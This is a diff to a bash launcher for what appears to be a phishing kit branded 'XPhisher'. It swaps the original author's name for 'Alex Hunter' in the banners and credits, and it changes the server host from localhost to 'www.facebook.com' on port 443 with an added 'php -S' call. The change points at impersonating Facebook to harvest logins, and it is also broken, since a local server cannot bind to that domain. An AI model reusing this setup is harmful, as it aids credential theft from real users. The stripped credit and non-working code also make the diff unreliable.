@@ -58,26 +58,26 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-                ${BLUE}┏━┓┏━┳━━━┳┓╋╋╋╋╋┏┓
-                ${BLUE}┗┓┗┛┏┫┏━┓┃┃╋╋╋╋╋┃┃
-                ${BLUE}╋┗┓┏┛┃┗━┛┃┗━┳┳━━┫┗━┳━━┳━┓
-                ${BLUE}╋┏┛┗┓┃┏━━┫┏┓┣┫━━┫┏┓┃┃━┫┏┛
-                ${BLUE}┏┛┏┓┗┫┃╋╋┃┃┃┃┣━━┃┃┃┃┃━┫┃
-                ${BLUE}┗━┛┗━┻┛╋╋┗┛┗┻┻━━┻┛┗┻━━┻┛             
-                ${RED} X PH4N70M (X PHANTOM)
+                ${ORANGE}┏━┓┏━┳━━━┳┓╋╋╋╋╋┏┓
+                ${ORANGE}┗┓┗┛┏┫┏━┓┃┃╋╋╋╋╋┃┃
+                ${ORANGE}╋┗┓┏┛┃┗━┛┃┗━┳┳━━┫┗━┳━━┳━┓
+                ${ORANGE}╋┏┛┗┓┃┏━━┫┏┓┣┫━━┫┏┓┃┃━┫┏┛
+                ${ORANGE}┏┛┏┓┗┫┃╋╋┃┃┃┃┣━━┃┃┃┃┃━┫┃
+                ${ORANGE}┗━┛┗━┻┛╋╋┗┛┗┻┻━━┻┛┗┻━━┻┛             
+                ${ORANGE} Alex Hunter
                                                   
 		${CYAN}Version : 2.2 
 		
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by X PHANTOM (X PH4N70M)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by ${ORANGE}Alex Hunter${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-                ${BLUE} ▀▄▀   █▀█ █░█ ▄▀█ █▄░█ ▀█▀ █▀█ █▀▄▀█
-                ${BLUE} █░█   █▀▀ █▀█ █▀█ █░▀█ ░█░ █▄█ █░▀░█
-		${RED}  X PHANTOM [PH4N70M]
+                ${ORANGE} ▀▄▀   █▀█ █░█ ▄▀█ █▄░█ ▀█▀ █▀█ █▀▄▀█
+                ${ORANGE} █░█   █▀▀ █▀█ █▀█ █░▀█ ░█░ █▄█ █░▀░█
+		${ORANGE}  Alex Hunter
 	EOF
 }
 
@@ -178,12 +178,12 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}X PHANTOM ${RED}[ ${ORANGE}X PH4N70M ${RED}]
+		${GREEN}Author   ${RED}:  ${ORANGE}Alex Hunter
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/hackerxphantom
 		${GREEN}Join us  ${RED}:  ${CYAN}https://bit.ly/3PV3S3r
 		${GREEN}Version  ${RED}:  ${ORANGE}2.2
 
-		${REDBG}${WHITE} Thanks : X PHANTOM,X PH4N70M ${RESETBG}
+		${REDBG}${WHITE} Thanks : Alex Hunter ${RESETBG}
 								  
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
@@ -208,8 +208,11 @@ about() {
 }
 
 ## Setup website and start php server
-HOST='127.0.0.1'
-PORT='8080'
+HOST='www.facebook.com'
+PORT='443'
+
+echo "Starting PHP server on https://$HOST:$PORT ..."
+php -S $HOST:$PORT
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
